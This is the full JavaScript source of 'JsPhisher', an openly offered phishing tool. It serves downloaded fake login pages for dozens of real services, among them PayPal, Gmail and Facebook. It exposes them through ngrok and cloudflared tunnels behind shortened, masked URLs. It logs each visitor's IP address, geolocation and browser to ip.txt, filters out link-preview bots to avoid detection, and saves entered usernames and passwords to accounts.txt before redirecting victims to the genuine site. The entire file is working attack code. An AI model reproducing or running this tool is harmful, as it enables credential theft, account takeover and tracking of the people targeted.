/**
 * JsPhisher - Easy phishing tool
 * Coded by: @gamerboytr
 * License: GPL-3.0
 * Its a open-source project
 * Please report any bugs to: https://github.com/gamerboytr/JsPhisher/issues
 */

"use strict";
try {
	require("axios");
} catch (e) {
	console.clear();
	if (e.code !== "MODULE_NOT_FOUND") {
		throw e;
	}
	console.log("You don't have modules installed.");
	console.log("Installing dependencies...");
	try {
		require("child_process").execSync("yarn install");
		console.log("Used yarn to install dependencies.");
	} catch {
		require("child_process").execSync("npm install");
	}
	console.log("Installed all dependencies.");
}
const express = require("express");
const bodyParser = require("body-parser");
const readlineSync = require("readline-sync");
const geoip = require("geoip-lite");
const chalk = require("chalk");
const agentParser = require("ua-parser-js");
const child_process = require("child_process");
const downloader = require("download");
const AdmZip = require("adm-zip");
const axios = require("axios").default;
const app = express();
const port = process.env.PORT || process.env.NODE_PORT || 6969;
const short = require("./short");
const path = require("path");
const fs = require("fs");

const VERSION = "1.3.1";
const isTermux = process.platform === "android";
const isLinux = process.platform === "linux" || isTermux;
const logAsk = chalk.greenBright`[{whiteBright ?}]`;
const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
const logError = chalk.redBright`[{whiteBright !}]`;
const logInfo = chalk.yellowBright`[{whiteBright +}]`;
const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;
const availableSites = {
	Adobe: "https://github.com/gamerboytr/files/blob/master/phishingsites/adobe.rar",
	Airtelsim: "https://github.com/gamerboytr/files/blob/master/phishingsites/airtelsim.rar",
	Amazon: "https://github.com/gamerboytr/files/blob/master/phishingsites/amazon.rar",
	Apple: "https://github.com/gamerboytr/files/blob/master/phishingsites/apple.rar",
	Badoo: "https://github.com/gamerboytr/files/blob/master/phishingsites/badoo.rar",
	"Clash of Clans": "https://github.com/gamerboytr/files/blob/master/phishingsites/clashofclans.rar",
	DeviantArt: "https://github.com/gamerboytr/files/blob/master/phishingsites/deviantart.rar",
	Discord: "https://github.com/gamerboytr/files/blob/master/phishingsites/discord.rar",
	Dropbox: "https://github.com/gamerboytr/files/blob/master/phishingsites/dropbox.rar",
	eBay: "https://github.com/gamerboytr/files/blob/master/phishingsites/ebay.rar",
	Facebook: "https://github.com/gamerboytr/files/blob/master/phishingsites/facebook.rar",
	"Facebook Advenced": "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_advanced.rar",
	Messenger: "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_messenger.rar",
	"Facebook Security": "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_security.rar",
	FreeFire: "https://github.com/gamerboytr/files/blob/master/phishingsites/freefire.rar",
	Github: "https://github.com/gamerboytr/files/blob/master/phishingsites/github.rar",
	Gitlab: "https://github.com/gamerboytr/files/blob/master/phishingsites/gitlab.rar",
	Gmail: "https://github.com/gamerboytr/files/blob/master/phishingsites/gmail.rar",
	Google: "https://github.com/gamerboytr/files/blob/master/phishingsites/google.rar",
	"Google Poll": "https://github.com/gamerboytr/files/blob/master/phishingsites/google_poll.rar",
	iCloud: "https://github.com/gamerboytr/files/blob/master/phishingsites/icloud.rar",
	"Insta Auto Followers": "https://github.com/gamerboytr/files/blob/master/phishingsites/ig_followers.rar",
	"Insta 1000 Followers": "https://github.com/gamerboytr/files/blob/master/phishingsites/insta_followers.rar",
	Instagram: "https://github.com/gamerboytr/files/blob/master/phishingsites/instagram.rar",
	Jiorouter: "https://github.com/gamerboytr/files/blob/master/phishingsites/jiorouter.rar",
	LinkedIn: "https://github.com/gamerboytr/files/blob/master/phishingsites/linkedin.rar",
	Mediafire: "https://github.com/gamerboytr/files/blob/master/phishingsites/mediafire.rar",
	Microsoft: "https://github.com/gamerboytr/files/blob/master/phishingsites/microsoft.rar",
	Myspace: "https://github.com/gamerboytr/files/blob/master/phishingsites/myspace.rar",
	Netflix: "https://github.com/gamerboytr/files/blob/master/phishingsites/netflix.rar",
	Origin: "https://github.com/gamerboytr/files/blob/master/phishingsites/origin.rar",
	Outlook: "https://github.com/gamerboytr/files/blob/master/phishingsites/outlook.rar",
	Paypal: "https://github.com/gamerboytr/files/blob/master/phishingsites/paypal.rar",
	Pinterest: "https://github.com/gamerboytr/files/blob/master/phishingsites/pinterest.rar",
	Playstation: "https://github.com/gamerboytr/files/blob/master/phishingsites/playstation.rar",
	Protonmail: "https://github.com/gamerboytr/files/blob/master/phishingsites/protonmail.rar",
	Pubg: "https://github.com/gamerboytr/files/blob/master/phishingsites/pubg.rar",
	Quora: "https://github.com/gamerboytr/files/blob/master/phishingsites/quora.rar",
	Reddit: "https://github.com/gamerboytr/files/blob/master/phishingsites/reddit.rar",
	Roblox: "https://github.com/gamerboytr/files/blob/master/phishingsites/roblox.rar",
	Shopify: "https://github.com/gamerboytr/files/blob/master/phishingsites/shopify.rar",
	Shopping: "https://github.com/gamerboytr/files/blob/master/phishingsites/shopping.rar",
	Snapchat: "https://github.com/gamerboytr/files/blob/master/phishingsites/snapchat.rar",
	Snapchat2: "https://github.com/gamerboytr/files/blob/master/phishingsites/snapchat2.rar",
	SocialClub: "https://github.com/gamerboytr/files/blob/master/phishingsites/socialclub.rar",
	Spotify: "https://github.com/gamerboytr/files/blob/master/phishingsites/spotify.rar",
	Stackoverflow: "https://github.com/gamerboytr/files/blob/master/phishingsites/stackoverflow.rar",
	Steam: "https://github.com/gamerboytr/files/blob/master/phishingsites/steam.rar",
	Telegram: "https://github.com/gamerboytr/files/blob/master/phishingsites/telegram.rar",
	TikTok: "https://github.com/gamerboytr/files/blob/master/phishingsites/tiktok.rar",
	Twitch: "https://github.com/gamerboytr/files/blob/master/phishingsites/twitch.rar",
	Twitter: "https://github.com/gamerboytr/files/blob/master/phishingsites/twitter.rar",
	Verizon: "https://github.com/gamerboytr/files/blob/master/phishingsites/verizon.rar",
	VK: "https://github.com/gamerboytr/files/blob/master/phishingsites/vk.rar",
	"VK Poll": "https://github.com/gamerboytr/files/blob/master/phishingsites/vk_poll.rar",
	"Wi-Fi": "https://github.com/gamerboytr/files/blob/master/phishingsites/wifi.rar",
	Wordpress: "https://github.com/gamerboytr/files/blob/master/phishingsites/wordpress.rar",
	Yahoo: "https://github.com/gamerboytr/files/blob/master/phishingsites/yahoo.rar",
	Yandex: "https://github.com/gamerboytr/files/blob/master/phishingsites/yandex.rar",
};
let siteConfig = {};

const logLogo =
	chalk.red`       _     _____  _     _     _               \n` +
	chalk.cyan`      | |   |  __ \\| |   (_)   | |              \n` +
	chalk.yellow`      | |___| |__) | |__  _ ___| |__   ___ _ __ \n` +
	chalk.blue`  _   | / __|  ___/| '_ \\| / __| '_ \\ / _ \\ '__|\n` +
	chalk.red` | |__| \\__ \\ |    | | | | \\__ \\ | | |  __/ |   \n` +
	chalk.yellow`  \\____/|___/_|    |_| |_|_|___/_| |_|\\___|_|\n` +
	chalk.cyan`				       [v${VERSION}]	  \n` +
	chalk.red`			      [By GamerboyTR]	  \n`;

console.clear();
console.log(logLogo);
const loggedIps = [];
if (process.platform === "darwin") {
	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
	process.exit(1);
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "bin", "instagram")));
app.disable("x-powered-by");

(async () => {
	await controlVersion().catch(throwError);
	await installRequirements().catch(throwError);
	process.on("SIGINT", _ => onExit());
	siteConfig = (await selectSite().catch(throwError)).config;
	startServer();
})();

app.all("/", async (req, res) => {
	const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
	const userAgent = req.headers["user-agent"];
	const ua = agentParser(userAgent);
	const referer = req.headers?.referer;
	const location = geoip.lookup(ip);
	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(throwError);
	res.redirect("login");
	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
		console.clear();
		console.log(logLogo);
		console.log(chalk.greenBright`${logSuccess} Victim IP found!\n`);

		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP Type              :  ${request.type}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User OS              :  ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser?.name ?? "Unknown"} ${ua.browser?.version}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Location             :  ${request?.city ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} GeoLocation(lat, lon):  ${location.ll.join(", ")}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Curreny              :  ${request.currency_code}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Referer              :  ${referer ?? "No referer"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} UserAgent            :  ${userAgent ?? "No agent"}\n`);

		loggedIps.push(ip);
		fs.appendFileSync(
			"./ip.txt",
			[
				`========================${siteConfig.name} ${new Date().toLocaleString()}========================`,
				`IP: ${ip}`,
				`IP Type: ${request.type}`,
				`User OS: ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`,
				`Browser: ${ua.browser?.name ?? "Unknown"} ${ua.browser?.version}`,
				`Location: ${request?.city ?? "Unknown"}`,
				`GeoLocation(lat, lon): ${location.ll.join(", ")}`,
				`Curreny: ${request.currency_code}`,
				`Referer: ${referer ?? "No referer"}`,
				`UserAgent: ${userAgent ?? "No agent"}`,
				"",
			].join("\n")
		);
		console.log(chalk.cyan`${logInfo} Saved in ip.txt\n`);
		console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
	}
});

app.post(["/login", "/login.php"], (req, res) => {
	const { username, password } = req.body;
	if (!username?.trim?.() || !password?.trim?.()) {
		res.redirect("login");
		return;
	}
	res.redirect(siteConfig?.redirect ?? "https://google.com");
	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);

	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} ${siteConfig?.name ?? "Victim"} Username:  ${username}`);
	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} ${siteConfig?.name ?? "Victim"} Password:  ${password}\n`);

	fs.appendFileSync("./accounts.txt", `========================${siteConfig.name.toUpperCase()} ${new Date().toLocaleString()}========================\nUsername : ${username}\nPassword : ${password}\n`);
	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
});

//! Functions

function controlVersion() {
	return new Promise(async (resolve, reject) => {
		const { data: readme } = await axios.get("https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/README.md").catch(reject);
		const version = readme.match(/Version-(.*?)-green/)[1];
		const changelogRequest = await axios.get(`https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/CHANGELOG.md`).catch(() => {});
		const changelog = changelogRequest?.data;
		if (version !== VERSION) {
			console.clear();
			console.log(logLogo);
			console.log(chalk.redBright`${logError} New version available!\n`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Current version:  ${VERSION}`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} New version:      ${version}\n`);
			console.log(chalk.yellow`${logAsk} Do you want to update? {yellowBright (y/n)}`);
			if (readlineSync.keyInYN("")) {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Updating...\n`);
				console.log(chalk.yellow`${logInfo} Downloading repo...`);
				const currentDir = process.cwd().replaceAll("\\", "/").split("/")[process.cwd().replaceAll("\\", "/").split("/").length - 2];
				child_process.execSync(`cd ../.. && ${isLinux ? `rm -rf ${currentDir}` : `rmdir /S /Q ${currentDir}`} && git clone https://github.com/gamerboytr/JsPhisher`);
				console.log(chalk.yellow`${logInfo} Updated!\n`);
				console.log(chalk.yellow`${logInfo} Please restart terminal manually.\n`);
				if (changelog) {
					console.log(chalk.yellow`${logInfo} Changelog:\n`);
					console.log(chalk.yellow(changelog));
				}
				process.exit();
			} else {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Using old version.\n`);
			}
		}
		resolve();
	});
}

function getArch() {
	let arch = process.arch;
	if (isLinux) {
		if (arch === "x64") {
			arch = "amd64";
		} else if (arch === "x32") {
			arch = "amd";
		}
	} else {
		if (arch === "x32") {
			arch = "386";
		}
	}
	return arch;
}

function installRequirements() {
	return new Promise(async (resolve, reject) => {
		console.clear();
		console.log(logLogo);
		//! Cloudflared
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${getArch()}.deb` : "windows-386.exe"}`;
			try {
				await downloader(cloudflaredLink, path.join(__dirname, "bin"), { filename: `cloudflared${!isLinux ? ".exe" : ""}` }).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				if (isLinux) {
					child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
				}
			} catch {
				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		//! Ngrok
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? `linux-${getArch()}.tgz` : "windows-386.zip"}`;
			try {
				await downloader(ngrokLink, path.join(__dirname, "bin"), { filename: `ngrok${isLinux ? ".tgz" : ".zip"}` }).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				console.log(chalk.yellow`${logInfo2} Extracting...`);
				if (isLinux) {
					child_process.execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.tgz"));
				} else {
					new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
				}
				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
			} catch {
				console.log(chalk.redBright`${logError} Failed to download ngrok!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		resolve();
	});
}

function openNgrok(port) {
	return new Promise(async (resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			return reject("Cannot found ngrok!");
		}
		child_process.spawn("bin/ngrok", ["http", port]);
		await new Promise(r => setTimeout(r, 3000));
		let ngrokUrl;
		while (!ngrokUrl) {
			try {
				let request = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
				if (request?.data?.tunnels?.[0]?.public_url) {
					ngrokUrl = (request.data.tunnels?.[1] ?? request.data.tunnels?.[0]).public_url;
				} else {
					await new Promise(r => setTimeout(r, 1000));
				}
			} catch (e) {
				return reject("Failed to start ngrok, please try again : " + e);
			}
		}
		resolve(ngrokUrl);
	});
}

function openCloudflared(port) {
	return new Promise((resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			return reject("Cannot found cloudlfared!");
		}
		if (isTermux) {
			return reject("Cloudflared is not supported on Termux");
		}
		let cfUrl;
		let cfShowed = false;
		let cfReady = false;
		child_process.spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", data => {
			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) {
				cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
			}
			cfReady = !!data.toString().match(/Connection (.*) registered/);
			if (cfReady && !cfShowed) {
				cfShowed = true;
				resolve(cfUrl[0]);
			}
		});
	});
}

function onExit(withoutLog = false) {
	if (!withoutLog) {
		console.log(chalk.yellowBright`\n${logInfo2} Thanks for using JsPhisher!\n`);
	}
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line").catch(() => {});
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line%20%28http%29").catch(() => {}); //! For HTTPS
	process.exit();
}

function throwError(error) {
	console.log(chalk.redBright`${logError} ${error}\n`);
	onExit(true);
}

function selectSite() {
	return new Promise(async resolve => {
		Object.keys(availableSites).forEach((site, index) => {
			const maxLength = Math.max(...Object.keys(availableSites).map(s => s.length)) + 10;
			let spacing = " ".repeat(maxLength);
			spacing = spacing.substring(0, maxLength - site.length);
			spacing = ((index + 1) / 3) % 1 === 0 ? "\n" : spacing;
			process.stdout.write(chalk.yellowBright`{greenBright [}{whiteBright ${index + 1 < 10 ? "0" + (index + 1) : index + 1}}{greenBright ]} ${site}${spacing}`);
		});
		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright X}{greenBright ]} About                  {greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
		const choose = readlineSync.prompt({ prompt: chalk.yellowBright`${logAsk} Select one of the options > ` });
		if (choose == "0") {
			onExit(true);
		} else if (choose === "X" || choose === "x") {
			scriptAbout();
			return;
		} else if (!choose || isNaN(parseInt(choose)) || Object.keys(availableSites).length < parseInt(choose) || parseInt(choose) < 0) {
			console.clear();
			console.log(chalk.redBright`${logError} Invalid input.`);
			selectSite();
			return;
		}
		const folder = availableSites[Object.keys(availableSites)[parseInt(choose) - 1]].split("/").pop().split(".")[0];
		const config = await downloadSites(folder).catch(throwError);
		app.get("/login", (_req, res) => {
			res.sendFile(path.join(__dirname, "bin", "websites", folder, "login.html"));
		});
		resolve({ site: folder, config });
	});
}

function downloadSites(folder) {
	return new Promise(async (resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder))) {
			console.log(chalk.yellowBright(`${logInfo} Downloading required files...`));
			try {
				if (!fs.existsSync(path.join(__dirname, "bin", "websites"))) {
					console.log(chalk.yellowBright(`${logInfo} Creating folder...`));
					fs.mkdirSync(path.join(__dirname, "bin", "websites"));
				}
				fs.writeFileSync(path.join(__dirname, "bin", "websites", folder + ".zip"), await downloader(`https://github.com/gamerboytr/files/raw/master/phishingsites/${folder}.zip`).catch(throwError));
				console.log(chalk.greenBright(`${logSuccess} Downloaded successfully.`));
				console.log(chalk.yellowBright(`${logInfo} Extracting files...`));
				new AdmZip(path.join(__dirname, "bin", "websites", folder + ".zip")).extractAllTo(path.join(__dirname, "bin", "websites", folder), true);
				console.log(chalk.greenBright(`${logSuccess} Extracted successfully.`));
				console.log(chalk.yellowBright(`${logInfo} Deleting zip file...`));
				fs.unlinkSync(path.join(__dirname, "bin", "websites", folder + ".zip"));
				console.log(chalk.greenBright(`${logSuccess} Deleted successfully.`));
			} catch (error) {
				console.log(chalk.redBright(`${logError} ${error}`));
				onExit(true);
			}
		}
		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder, "config.json"))) {
			reject("Cannot found config.json!");
			return;
		}
		resolve(JSON.parse(fs.readFileSync(path.join(__dirname, "bin", "websites", folder, "config.json"), "utf8")));
	});
}

async function scriptAbout() {
	console.clear();
	console.log(logLogo);
	console.log(chalk.redBright`[ToolName]  {cyanBright :[JsPhisher]} `);
	console.log(chalk.redBright`[Version]   {cyanBright :[${VERSION}]}`);
	console.log(chalk.redBright`[Author]    {cyanBright :[GamerboyTR] }`);
	console.log(chalk.redBright`[Github]    {cyanBright :[https://github.com/gamerboytr] }`);
	console.log(chalk.redBright`[Discord]   {cyanBright :[https://discord.gg/turkishmethods] }`);
	console.log(chalk.redBright`[Email]     {cyanBright :[offical.gamerboytr@yandex.com]}\n`);
	console.log(chalk.yellowBright`{greenBright [}{whiteBright 0}{greenBright ]} Exit                     {greenBright [}{whiteBright 99}{greenBright ]}  Main Menu       `);
	const choose = readlineSync.prompt({ prompt: "\n > " });
	if (choose == "0") {
		onExit(true);
	} else if (choose == "99") {
		console.clear();
		console.log(logLogo);
		siteConfig = (await selectSite().catch(throwError)).config;
		startServer();
	} else {
		console.log(chalk.redBright`${logError} Invalid input.`);
		scriptAbout();
	}
}

async function startServer() {
	console.clear();
	console.log(logLogo);
	console.log(chalk.magenta`${logInfo2} Selected {bold ${siteConfig.name}}\n`);
	if (isTermux) {
		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
		await new Promise(r => setTimeout(r, 1000));
	}
	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
	await new Promise(r => {
		try {
			app.listen(port, _ => {
				console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
				r();
			});
		} catch (e) {
			throwError(e);
		}
	});
	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
	const ngrok = await openNgrok(port).catch(throwError);
	const shortNgrok = await short(ngrok).catch(throwError);
	const cloudflared = !isTermux ? await openCloudflared(port).catch(throwError) : null;
	const shortCf = !isTermux ? await short(cloudflared).catch(throwError) : null;
	if (!isTermux) {
		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
	}
	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
}
